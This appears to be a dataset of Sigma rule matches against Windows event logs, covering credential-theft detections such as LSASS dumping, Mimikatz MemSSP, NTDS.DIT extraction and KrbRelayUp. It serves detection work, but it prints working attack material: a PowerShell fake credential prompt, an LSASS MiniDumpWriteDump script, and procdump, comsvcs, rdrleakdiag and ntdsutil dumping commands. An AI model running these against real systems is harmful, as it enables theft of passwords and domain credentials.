[
  {
    "Rule level": "critical",
    "title": "Mimikatz MemSSP Default Log File Creation",
    "sigma_yml": "file_event_win_mimimaktz_memssp_log_file.yml",
    "description": "Detects Mimikatz MemSSP default log file creation",
    "row_id": 33359,
    "CreationUtcTime": "2020-09-11 12:10:22.357",
    "Image": "C:\\Windows\\system32\\lsass.exe",
    "ProcessGuid": "747F3D96-672C-5F5B-0D00-00000000FC00",
    "ProcessId": 3044,
    "TargetFileName": "C:\\Windows\\System32\\mimilsa.log",
    "UtcTime": "2020-09-11 12:10:22.357",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 11,
    "EventRecordID": 385052,
    "ThreadID": 3900,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 11,
    "SystemTime": "2020-09-11T12:10:22.398726Z",
    "Version": 2,
    "OriginalLogfile": "CA_Mimikatz_Memssp_Default_Logs_Sysmon_11.evtx-Q6FXROYQ.json",
    "RuleName": "-"
  },
  {
    "Rule level": "high",
    "title": "PowerShell Credential Prompt",
    "sigma_yml": "posh_ps_prompt_credentials.yml",
    "description": "Detects PowerShell calling a credential prompt",
    "row_id": 33358,
    "ProcessId": 5500,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 4104,
    "EventRecordID": 1123,
    "ThreadID": 356,
    "Keywords": "0x0",
    "Level": 3,
    "Opcode": 15,
    "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
    "Provider_Name": "Microsoft-Windows-PowerShell",
    "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
    "Task": 2,
    "SystemTime": "2019-09-09T13:35:09.315230Z",
    "Version": 1,
    "OriginalLogfile": "phish_windows_credentials_powershell_scriptblockLog_4104.evtx-N48P5T0I.json",
    "ActivityID": "B5ABE6C2-675C-0001-A601-ACB55C67D501",
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd",
    "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt"
  },
  {
    "Rule level": "high",
    "title": "PowerShell Get-Process LSASS in ScriptBlock",
    "sigma_yml": "posh_ps_susp_getprocess_lsass.yml",
    "description": "Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity",
    "row_id": 35488,
    "ProcessId": 7008,
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 4104,
    "EventRecordID": 971,
    "ThreadID": 6488,
    "Keywords": "0x0",
    "Level": 3,
    "Opcode": 15,
    "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A",
    "Provider_Name": "Microsoft-Windows-PowerShell",
    "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000",
    "Task": 2,
    "SystemTime": "2020-06-30T14:24:08.254605Z",
    "Version": 1,
    "OriginalLogfile": "Powershell_4104_MiniDumpWriteDump_Lsass.evtx-EAZ88PUE.json",
    "ActivityID": "4AA5EAE3-4F33-0001-3A2B-A64A334FD601",
    "MessageNumber": 1,
    "MessageTotal": 1,
    "ScriptBlockId": "27f08bda-c330-419f-b83b-eb5c0f699930",
    "ScriptBlockText": "function Memory($path)\r\n{\r\n\t\t\t  \r\n\t\t\t  \r\n\t\t$Process = Get-Process lsass\r\n\t\t$DumpFilePath = $path\r\n\t\t\r\n\t\t$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')\r\n\t\t$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')\r\n\t\t$Flags = [Reflection.BindingFlags] 'NonPublic, Static'\r\n\t\t$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)\r\n\t\t$MiniDumpWithFullMemory = [UInt32] 2\r\n\t\r\n\t\t\t\r\n\t\t\t  #\r\n\t\t$ProcessId = $Process.Id\r\n\t\t$ProcessName = $Process.Name\r\n\t\t$ProcessHandle = $Process.Handle\r\n\t\t$ProcessFileName = \"$($ProcessName).dmp\"\r\n\t\t\r\n\t\t$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName\r\n\t\t\r\n\t\t$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)\r\n\t\t\t  \r\n\t\t$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$ProcessId,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$FileStream.SafeFileHandle,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t$MiniDumpWithFullMemory,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t[IntPtr]::Zero))\r\n\t\t\t  \r\n\t\t$FileStream.Close()\r\n\t\t\r\n\t\tif (-not $Result)\r\n\t\t{\r\n\t\t\t$Exception = New-Object ComponentModel.Win32Exception\r\n\t\t\t$ExceptionMessage = \"$($Exception.Message) ($($ProcessName):$($ProcessId))\"\r\n\t\t\t\r\n\t\t\t# Remove any partially written dump files. For example, a partial dump will be written\r\n\t\t\t# in the case when 32-bit PowerShell tries to dump a 64-bit process.\r\n\t\t\tRemove-Item $ProcessDumpPath -ErrorAction SilentlyContinue\r\n\t\t\t\r\n\t\t\tthrow $ExceptionMessage\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t\"Memdump complete!\"\r\n\t\t}\r\n\t\r\n}",
    "Path": "C:\\Users\\Public\\lsass_wer_ps.ps1"
  },
  {
    "Rule level": "high",
    "title": "LSASS Memory Dump",
    "sigma_yml": "proc_access_win_lsass_memdump.yml",
    "description": "Detects process LSASS memory dump using Mimikatz, NanoDump, Invoke-Mimikatz, Procdump or Taskmgr based on the CallTrace pointing to ntdll.dll, dbghelp.dll or dbgcore.dll for win10, server2016 and up.",
    "row_id": 34480,
    "ProcessId": 1960,
    "UtcTime": "2019-05-02 14:49:37.100",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 10,
    "EventRecordID": 10273,
    "ThreadID": 1616,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 10,
    "SystemTime": "2019-05-02T14:50:17.955524Z",
    "Version": 3,
    "OriginalLogfile": "sysmon_3_10_Invoke-Mimikatz_hosted_Github.evtx-KDY1SC6N.json",
    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185",
    "GrantedAccess": "0x143a",
    "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceProcessGUID": "365ABB72-0244-5CCB-0000-00109AE70B00",
    "SourceProcessId": 1508,
    "SourceThreadId": 3204,
    "TargetImage": "C:\\Windows\\system32\\lsass.exe",
    "TargetProcessGUID": "365ABB72-8077-5CCB-0000-0010F2590000",
    "TargetProcessId": 484
  },
  {
    "Rule level": "high",
    "title": "Suspicious GrantedAccess Flags on LSASS Access",
    "sigma_yml": "proc_access_win_susp_proc_access_lsass.yml",
    "description": "Detects process access to LSASS memory with suspicious access flags",
    "row_id": 34480,
    "ProcessId": 1960,
    "UtcTime": "2019-05-02 14:49:37.100",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "IEWIN7",
    "EventID": 10,
    "EventRecordID": 10273,
    "ThreadID": 1616,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 10,
    "SystemTime": "2019-05-02T14:50:17.955524Z",
    "Version": 3,
    "OriginalLogfile": "sysmon_3_10_Invoke-Mimikatz_hosted_Github.evtx-KDY1SC6N.json",
    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185",
    "GrantedAccess": "0x143a",
    "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "SourceProcessGUID": "365ABB72-0244-5CCB-0000-00109AE70B00",
    "SourceProcessId": 1508,
    "SourceThreadId": 3204,
    "TargetImage": "C:\\Windows\\system32\\lsass.exe",
    "TargetProcessGUID": "365ABB72-8077-5CCB-0000-0010F2590000",
    "TargetProcessId": 484
  },
  {
    "Rule level": "high",
    "title": "Suspicious Use of Procdump on LSASS",
    "sigma_yml": "proc_creation_win_susp_procdump_lsass.yml",
    "description": "Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable.",
    "row_id": 33927,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ProcessGuid": "747F3D96-DD9E-5D31-0000-00106E2C4B00",
    "ProcessId": 2796,
    "UtcTime": "2019-07-19 15:11:26.626",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 4124,
    "ThreadID": 3592,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-07-19T15:11:26.642464Z",
    "Version": 5,
    "OriginalLogfile": "PanacheSysmon_vs_AtomicRedTeam01.evtx-FRGGW1BM.json",
    "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp\"",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\AtomicRedTeam\\",
    "Description": "Windows Command Processor",
    "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
    "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
    "IntegrityLevel": "High",
    "LogonGuid": "747F3D96-D4B4-5D31-0000-002051090500",
    "LogonId": "0x50951",
    "ParentCommandLine": "powershell",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentProcessGuid": "747F3D96-DD47-5D31-0000-001015874900",
    "ParentProcessId": 5840,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser"
  },
  {
    "Rule level": "critical",
    "title": "Suspicious LSASS Process Clone",
    "sigma_yml": "proc_creation_win_susp_lsass_clone.yml",
    "description": "Detects a suspicious LSASS process process clone that could be a sign of process dumping activity",
    "row_id": 30202,
    "Image": "C:\\Windows\\System32\\lsass.exe",
    "ProcessGuid": "BC47D85C-DB68-5F71-0000-00109138AB01",
    "ProcessId": 2848,
    "UtcTime": "2020-09-28 12:47:36.212",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "DESKTOP-PIU87N6",
    "EventID": 1,
    "EventRecordID": 5228,
    "ThreadID": 2328,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2020-09-28T12:47:36.215504Z",
    "Version": 5,
    "OriginalLogfile": "sysmon_rdrleakdiag_lsass_dump.evtx-32XX5W6Z.json",
    "CommandLine": "C:\\WINDOWS\\system32\\lsass.exe",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\WINDOWS\\system32\\",
    "Description": "Local Security Authority Process",
    "FileVersion": "10.0.19041.488 (WinBuild.160101.0800)",
    "Hashes": "MD5=BBBA8CE22384213070D0B9511EA181C5,SHA256=C41F0ECA09CBCEC776E807522C048A9E7A2D92CC3B4ECCDE2F8F6C42536AD094,IMPHASH=09FDE88C65E2BC5F1F90E96B673C52B1",
    "IntegrityLevel": "System",
    "LogonGuid": "BC47D85C-FAA9-5F68-0000-0020E7030000",
    "LogonId": "0x3e7",
    "ParentCommandLine": "C:\\WINDOWS\\system32\\lsass.exe",
    "ParentImage": "C:\\Windows\\System32\\lsass.exe",
    "ParentProcessGuid": "BC47D85C-FAA9-5F68-0000-0010D9590000",
    "ParentProcessId": 668,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 0,
    "User": "NT AUTHORITY\\SYSTEM",
    "OriginalFileName": "lsass.exe"
  },
  {
    "Rule level": "high",
    "title": "Suspicious Process Patterns NTDS.DIT Exfil",
    "sigma_yml": "proc_creation_win_susp_ntds.yml",
    "description": "Detects suspicious process patterns used in NTDS.DIT exfiltration",
    "row_id": 33929,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ProcessGuid": "747F3D96-DD9E-5D31-0000-001059374B00",
    "ProcessId": 2796,
    "UtcTime": "2019-07-19 15:11:26.845",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 4126,
    "ThreadID": 3592,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-07-19T15:11:26.852817Z",
    "Version": 5,
    "OriginalLogfile": "PanacheSysmon_vs_AtomicRedTeam01.evtx-FRGGW1BM.json",
    "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c \"ntdsutil â€œac i ntdsâ€ â€œifmâ€ â€œcreate full C:\\Atomic_Red_Team q q\"",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\AtomicRedTeam\\",
    "Description": "Windows Command Processor",
    "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
    "Hashes": "SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",
    "IntegrityLevel": "High",
    "LogonGuid": "747F3D96-D4B4-5D31-0000-002051090500",
    "LogonId": "0x50951",
    "ParentCommandLine": "powershell",
    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ParentProcessGuid": "747F3D96-DD47-5D31-0000-001015874900",
    "ParentProcessId": 5840,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "Process Dump via Rundll32 and Comsvcs.dll",
    "sigma_yml": "proc_creation_win_process_dump_rundll32_comsvcs.yml",
    "description": "Detects process memory dump via comsvcs.dll and rundll32 using different techniques (ordinal, minidump function...etc)",
    "row_id": 32516,
    "Image": "C:\\Windows\\System32\\rundll32.exe",
    "ProcessGuid": "747F3D96-1C70-5D69-0000-0010C9661F00",
    "ProcessId": 3292,
    "UtcTime": "2019-08-30 12:54:08.331",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "MSEDGEWIN10",
    "EventID": 1,
    "EventRecordID": 32154,
    "ThreadID": 928,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2019-08-30T12:54:08.354049Z",
    "Version": 5,
    "OriginalLogfile": "sysmon_10_1_memdump_comsvcs_minidump.evtx-X4PXDUA8.json",
    "CommandLine": "rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 4868 C:\\Windows\\System32\\notepad.bin full",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Windows\\system32\\",
    "Description": "Windows host process (Rundll32)",
    "FileVersion": "10.0.17763.1 (WinBuild.160101.0800)",
    "Hashes": "SHA1=F3BA3415DD068A8871F285570BEA2E29874CBFF1,MD5=C73BA51880F5A7FB20C84185A23212EF,SHA256=01B407AF0200B66A34D9B1FA6D9EAAB758EFA36A36BB99B554384F59F8690B1A,IMPHASH=F27A7FC3A53E74F45BE370131953896A",
    "IntegrityLevel": "High",
    "LogonGuid": "747F3D96-1B6A-5D69-0000-0020E5810E00",
    "LogonId": "0xe81e5",
    "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentProcessGuid": "747F3D96-1C70-5D69-0000-0010D4551F00",
    "ParentProcessId": 1144,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "MSEDGEWIN10\\IEUser"
  },
  {
    "Rule level": "high",
    "title": "Process Dump via RdrLeakDiag.exe",
    "sigma_yml": "proc_creation_win_process_dump_rdrleakdiag.yml",
    "description": "Detects a process memory dump performed by RdrLeakDiag.exe",
    "row_id": 30200,
    "Image": "C:\\Windows\\System32\\rdrleakdiag.exe",
    "ProcessGuid": "BC47D85C-DB68-5F71-0000-0010B237AB01",
    "ProcessId": 2848,
    "UtcTime": "2020-09-28 12:47:36.192",
    "Channel": "Microsoft-Windows-Sysmon/Operational",
    "Computer": "DESKTOP-PIU87N6",
    "EventID": 1,
    "EventRecordID": 5226,
    "ThreadID": 2328,
    "Keywords": "0x8000000000000000",
    "Level": 4,
    "Opcode": 0,
    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
    "Provider_Name": "Microsoft-Windows-Sysmon",
    "UserID": "S-1-5-18",
    "Task": 1,
    "SystemTime": "2020-09-28T12:47:36.197943Z",
    "Version": 5,
    "OriginalLogfile": "sysmon_rdrleakdiag_lsass_dump.evtx-32XX5W6Z.json",
    "CommandLine": "rdrleakdiag.exe  /p 668 /o C:\\Users\\wanwan\\Desktop /fullmemdmp /snap",
    "Company": "Microsoft Corporation",
    "CurrentDirectory": "C:\\Users\\wanwan\\Desktop\\SysinternalsSuite\\",
    "Description": "Microsoft Windows Resource Leak Diagnostic",
    "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
    "Hashes": "MD5=C04F4FB2C7B44E19E85908459D3F0085,SHA256=D66E1EE7970598A5F34FD4B468B5B7705219E80A8A2784E7B18564831FCA797C,IMPHASH=5D87ACDE58B6E042FB38FE42B86E9C25",
    "IntegrityLevel": "High",
    "LogonGuid": "BC47D85C-6E10-5F68-0000-0020900B0300",
    "LogonId": "0x30b90",
    "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\" ",
    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessGuid": "BC47D85C-9569-5F71-0000-0010D9FD8300",
    "ParentProcessId": 1456,
    "Product": "Microsoft® Windows® Operating System",
    "TerminalSessionId": 1,
    "User": "DESKTOP-PIU87N6\\wanwan",
    "OriginalFileName": "RdrLeakDiag.exe"
  },
  {
    "Rule level": "high",
    "title": "KrbRelayUp Attack Pattern",
    "sigma_yml": "win_susp_krbrelayup.yml",
    "description": "Detects logon events that have characteristics of events generated during an attack with KrbRelayUp and the like",
    "row_id": 36110,
    "ProcessId": 680,
    "Channel": "Security",
    "Computer": "02694w-win10.threebeesco.com",
    "EventID": 4624,
    "EventRecordID": 72742,
    "ThreadID": 768,
    "Keywords": "0x8020000000000000",
    "Level": 0,
    "Opcode": 0,
    "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
    "Provider_Name": "Microsoft-Windows-Security-Auditing",
    "Task": 12544,
    "SystemTime": "2022-04-25T22:17:47.058172Z",
    "Version": 2,
    "OriginalLogfile": "privesc_KrbRelayUp_windows_4624.evtx-AXKHZAVS.json",
    "LogonGuid": "35D5E180-95BD-9ED7-7EFE-C355D7215A87",
    "SubjectDomainName": "-",
    "SubjectLogonId": "0x0",
    "SubjectUserName": "-",
    "SubjectUserSid": "S-1-0-0",
    "TargetDomainName": "THREEBEESCO.COM",
    "TargetUserName": "Administrator",
    "TargetLogonId": "0x8a38de",
    "TargetUserSid": "S-1-5-21-308926384-506822093-3341789130-500",
    "ProcessName": "-",
    "AuthenticationPackageName": "Kerberos",
    "ElevatedToken": "%%1842",
    "ImpersonationLevel": "%%1833",
    "IpAddress": "127.0.0.1",
    "IpPort": "50163",
    "KeyLength": 0,
    "LmPackageName": "-",
    "LogonProcessName": "Kerberos",
    "LogonType": 3,
    "RestrictedAdminMode": "-",
    "TargetLinkedLogonId": "0x0",
    "TargetOutboundDomainName": "-",
    "TargetOutboundUserName": "-",
    "TransmittedServices": "-",
    "VirtualAccount": "%%1843",
    "WorkstationName": "-",
    "ActivityID": "6C67E3EE-58ED-0002-0DE4-676CED58D801"
  },
  {
    "Rule level": "high",
    "title": "LSASS Access from Non System Account",
    "sigma_yml": "win_lsass_access_non_system_account.yml",
    "description": "Detects potential mimikatz-like tools accessing LSASS from non system account",
    "row_id": 36096,
    "ProcessId": 4,
    "Channel": "Security",
    "Computer": "MSEDGEWIN10",
    "EventID": 4656,
    "EventRecordID": 314461,
    "ThreadID": 160,
    "Keywords": "0x8020000000000000",
    "Level": 0,
    "Opcode": 0,
    "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
    "Provider_Name": "Microsoft-Windows-Security-Auditing",
    "Task": 12802,
    "SystemTime": "2020-03-08T22:11:34.340479Z",
    "Version": 1,
    "OriginalLogfile": "CA_hashdump_4663_4656_lsass_access.evtx-61AO6K06.json",
    "SubjectDomainName": "MSEDGEWIN10",
    "SubjectLogonId": "0x33392",
    "SubjectUserName": "IEUser",
    "SubjectUserSid": "S-1-5-21-3461203602-4096304019-2269080069-1000",
    "AccessList": "%%1537\r\n\t\t\t\t%%1538\r\n\t\t\t\t%%1539\r\n\t\t\t\t%%1540\r\n\t\t\t\t%%1541\r\n\t\t\t\t%%4480\r\n\t\t\t\t%%4481\r\n\t\t\t\t%%4482\r\n\t\t\t\t%%4483\r\n\t\t\t\t%%4484\r\n\t\t\t\t%%4485\r\n\t\t\t\t%%4486\r\n\t\t\t\t%%4487\r\n\t\t\t\t%%4488\r\n\t\t\t\t%%4489\r\n\t\t\t\t%%4490\r\n\t\t\t\t%%4491\r\n\t\t\t\t%%4492\r\n\t\t\t\t%%4493\r\n\t\t\t\t",
    "AccessMask": "0x1f3fff",
    "HandleId": "0x558",
    "ObjectName": "\\Device\\HarddiskVolume1\\Windows\\System32\\lsass.exe",
    "ObjectServer": "Security",
    "ObjectType": "Process",
    "PrivilegeList": "-",
    "ProcessName": "C:\\Windows\\System32\\cscript.exe",
    "AccessReason": "-",
    "RestrictedSidCount": 0,
    "TransactionId": "00000000-0000-0000-0000-000000000000",
    "ResourceAttributes": "-"
  }
]